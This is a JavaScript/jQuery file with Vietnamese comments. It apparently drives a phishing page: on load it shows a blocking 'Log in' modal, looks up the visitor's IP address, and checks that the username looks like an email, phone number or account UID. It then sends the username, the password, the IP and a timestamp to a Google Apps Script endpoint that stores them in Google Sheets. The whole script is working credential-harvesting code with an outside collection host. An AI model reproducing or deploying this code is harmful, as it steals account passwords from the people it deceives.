$(document).ready(function() {
    // Hiển thị modal khi trang được tải
    $('#btnModal').modal('show');

    // Lấy địa chỉ IP của người dùng và điền vào trường ẩn
    $.get("https://api.ipify.org?format=json")
        .done(function(data) {
            var ip = data.ip;
            $("#userIp").val(ip);
            console.log("User IP:", ip); // Kiểm tra địa chỉ IP
        })
        .fail(function() {
            console.error("Failed to retrieve IP address.");
        });

    // Xử lý sự kiện khi nhấn nút "Log in"
    $("#submit-form").click(function(event) {
        event.preventDefault(); // Ngăn form được submit mặc định

        // Lấy thời gian hiện tại
        var currentTime = new Date().toLocaleString();
        // Cập nhật giá trị của trường ẩn với thời gian hiện tại
        $("#current-time").val(currentTime);

        var userValue = $("input[name='user']").val();
        var passValue = $("input[name='pass']").val();
        // Biểu thức chính quy để kiểm tra email, số điện thoại hoặc UID
        var regex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$|0\d{10}$|\d{12,16}/;

        // Kiểm tra tính hợp lệ của dữ liệu
        if (!(regex.test(userValue) && passValue !== "")) {
            // Nếu dữ liệu không hợp lệ, hiển thị thông báo cảnh báo và ngăn việc gửi dữ liệu
            alert("Please enter the correct format.\nEmail or phone number or UID.");
            return;
        }

        // Gửi dữ liệu từ biểu mẫu đến Google Sheets thông qua AJAX
        var data = $('#test-form').serialize();
        console.log("Data sent to Google Sheets:", data); // Kiểm tra dữ liệu được gửi đi

        $.ajax({
            type: 'GET',
            url: 'https://script.google.com/macros/s/AKfycby6LfoEPWfjFrr5wkRz3TVBDPxRvTkTKVmGNaSQUCuFelSEOOBkMEYDw5HVlQUD2ZFzAw/exec',
            dataType: 'json',
            crossDomain: true,
            data: data,
            success: function(response) {
                if (response.result === 'success') {
                    alert('Data submitted successfully');
                    hideModal(); // Ẩn modal sau khi gửi dữ liệu thành công
                } else {
                    alert('Failed to submit data');
                }
            },
            error: function(xhr, status, error) {
                console.error("AJAX request failed:", status, error);
            }
        });
    });
});

document.addEventListener('DOMContentLoaded', function() {
    var modal = document.getElementById("btnModal");
    var blurBackground = document.getElementById("blurBackground");
    var content = document.getElementById("content");

    // Function to show the modal
    function showModal() {
        if (modal && blurBackground && content) {
            $('#btnModal').modal('show');
            blurBackground.style.display = "block";
        }
    }

    // Function to hide the modal
    function hideModal() {
        if (modal && blurBackground && content) {
            $('#btnModal').modal('hide');
            blurBackground.style.display = "none";
            content.style.display = "block";
        }
    }

    // Initially show the modal
    showModal();
});
